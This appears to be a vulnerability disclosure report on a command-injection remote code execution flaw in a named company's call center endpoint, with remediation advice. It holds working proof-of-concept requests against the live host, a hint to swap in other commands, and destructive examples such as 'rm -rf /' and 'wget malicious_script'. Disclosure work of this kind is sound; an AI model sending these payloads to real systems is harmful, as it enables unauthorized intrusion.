# Vulnerability Title
**Remote Code Execution (RCE) Vulnerability in Aishida Co., Ltd. Call Center System**  


# Vulnerability Overview
A Remote Code Execution (RCE) vulnerability exists in the interface of Aishida Co., Ltd.'s call center system. Attackers can exploit this vulnerability by crafting malicious request parameters to execute arbitrary shell commands on the target server, thereby gaining full control of the system. The root cause is insufficient input validation, allowing attackers to inject command separators (e.g., `||`) to trigger malicious code execution.  


# Asset Verification
## Company Profile
Aishida Co., Ltd. (Stock Code: 002403), founded in 1978, is a publicly listed enterprise specializing in the R&D, manufacturing, and marketing of cookware, small kitchen appliances, and industrial robots. With nearly 10,000 employees, the company achieved over 3 billion RMB in sales revenue in 2021. It operates production facilities in Wenling, Jiashan, Hubei, and Shanghai, and maintains a comprehensive sales network covering over 60,000 terminals (direct sales + distributors), e-commerce platforms, live streaming, social communities, group purchasing, TV shopping, cross-border e-commerce, and OEM exports. Brand ambassadors include Sun Li and Ren Jialun.  

Aishida has participated in drafting 20 national or industry standards for cookware, including non-stick pans, smokeless pans, aluminum pressure cookers, and stainless steel pressure cookers. The GB 15066—2004 stainless steel pressure cooker standard, co-drafted by Aishida, won the China Standards Innovation Contribution Award. The company is recognized as a National Intellectual Property Pilot Enterprise and a National Torch Program Key High-Tech Enterprise. Guided by its mission, "Manufacturing Healthy Kitchen Products to Enhance Human Life Quality," Aishida strives to promote green kitchens and aims to evolve into a dual-driven enterprise integrating cookware, home goods, consumer products, and intelligent manufacturing.  

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1741960859990-099ce111-60ab-434b-8922-7ca6c6af26ea.png)  

## Corporate Information
### ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1741961216972-90c4cb20-8b40-4e15-a67c-23f0972ffaac.png)
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1741961341526-993f929b-b0c0-4640-a63d-966165b11ee1.png)  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1741961255910-c1d5af07-3ddd-45af-ac8c-04f6fbde7912.png)  

+ **Chinese Name:** 爱仕达股份有限公司  
+ **English Name:** Aishida Co., Ltd.  
+ **Website:** [http://www.chinaasd.com](http://www.chinaasd.com)  
+ **Email:** 445778987@qq.com


# Technical Analysis
## Vulnerability Location
**Affected Endpoint:**  

```http
http://www.asd.com.cn/doscall/weixin/open/amr2mp3?file=[User Input]  
```

## Root Cause
1. **Lack of Input Sanitization:** The `file` parameter is directly concatenated into system commands (e.g., using `system()` or `popen()` functions).  
2. **Command Injection Logic:**  
The server expects to execute commands such as:  

```bash
ffmpeg -i [User Input].amr output.mp3  
```

If an attacker injects `a 'aaabbbcccddd || sleep 5 ||`, the executed command becomes:  

```bash
ffmpeg -i a 'aaabbbcccddd || sleep 5 ||.amr output.mp3  
```

The shell interpreter treats `||` as command separators, causing `sleep 5` to execute independently.


# Proof of Concept (PoC)
## PoC 1: Delay via Sleep Command
### Sleep for 5 Seconds
1. **PoC Request:**  

```http
http://www.asd.com.cn/doscall/weixin/open/amr2mp3?file=a 'aaabbbcccddd || `sleep 5`   ||  
```

2. **URL-Encoded Request:**  

```http
http://www.asd.com.cn/doscall/weixin/open/amr2mp3?file=a%20%27aaabbbcccddd%20||%20`sleep%205`%20%20%20||  
```

3. **Validation:**  
    - Observe response time: A 5-second delay confirms successful execution.  
    - Replace `sleep 5` with other commands (e.g., `id`) to retrieve system user information.

### Burp Suite Request
```http
GET /doscall/weixin/open/amr2mp3?file=a%20%27aaabbbcccddd%20||%20`sleep%205`%20%20%20|| HTTP/1.1  
Host: www.asd.com.cn  
Upgrade-Insecure-Requests: 1  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Accept-Encoding: gzip, deflate, br  
Accept-Language: zh-CN,zh;q=0.9  
Cookie: PHPSESSID=2s9mg0ocf8hsvru6rfh9agvhh7  
x-forwarded-for: 127.0.0.1  
Connection: keep-alive  
```

### Screenshots
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1741961160896-35b79252-647c-4447-ac0b-b75b87a5b4c1.png)  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1741961815540-79db6fd6-544e-44fc-aa78-6d7471e2cae6.png)  


## PoC 2: Sleep for 10 Seconds
```http
GET /doscall/weixin/open/amr2mp3?file=a%20%27aaabbbcccddd%20||%20`sleep%2010`%20%20%20|| HTTP/1.1  
Host: www.asd.com.cn  
Upgrade-Insecure-Requests: 1  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Accept-Encoding: gzip, deflate, br  
Accept-Language: zh-CN,zh;q=0.9  
Cookie: PHPSESSID=2s9mg0ocf8hsvru6rfh9agvhh7  
x-forwarded-for: 127.0.0.1  
Connection: keep-alive  
```

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1741961982633-d84201b4-5d26-421b-b924-ef003e78fdd6.png)  


# Impact Assessment
1. **Full Server Compromise:** Attackers can execute commands like `rm -rf /` or `wget malicious_script`, leading to data breaches or system crashes.  
2. **Lateral Movement:** Compromised servers can be used as pivots to attack internal databases or other systems.  
3. **Compliance Risks:** Violates Articles 21 and 25 of China’s Cybersecurity Law, exposing the company to legal penalties.  
4. **Reputation Damage:** Data breaches severely harm brand credibility.


# Remediation Strategies
## 1. Input Filtering & Whitelisting
+ **Regex Filtering:** Restrict the `file` parameter to valid characters (e.g., `^[a-zA-Z0-9_\-\.]+$`), blocking inputs containing `|`, `&`, `;`, etc.  
+ **Predefined File List:** Match input against a predefined list if `file` corresponds to fixed resources.

## 2. Secure Command Execution
+ **Parameterized APIs (Python Example):**  

```python
subprocess.run(["ffmpeg", "-i", user_input + ".amr", "output.mp3"], shell=False)  
```

+ **Avoid Command Concatenation:** Refrain from using high-risk functions like `os.system()`.

## 3. Least Privilege
+ **Non-root Execution:** Run web services under a non-root user with restricted filesystem access.

## 4. Emergency Mitigation
+ **WAF Rules:** Block requests containing keywords like `sleep`, `&&`, `||`.  
+ **Log Monitoring:** Alert on suspicious activities (e.g., `/bin/sh` invocations).

## 5. Long-term Hardening
+ **Code Audit:** Review all interfaces for similar vulnerabilities.  
+ **Penetration Testing:** Conduct regular third-party black-box testing.


**Formatting Notes:**  

1. Use ` to separate sections for clarity.  
2. Specify code block languages (e.g., `bash`, `http`) for readability.  
3. Include technical details (e.g., regex patterns, code samples) in remediation strategies.  
4. Supplement PoC sections with screenshots to enhance credibility.

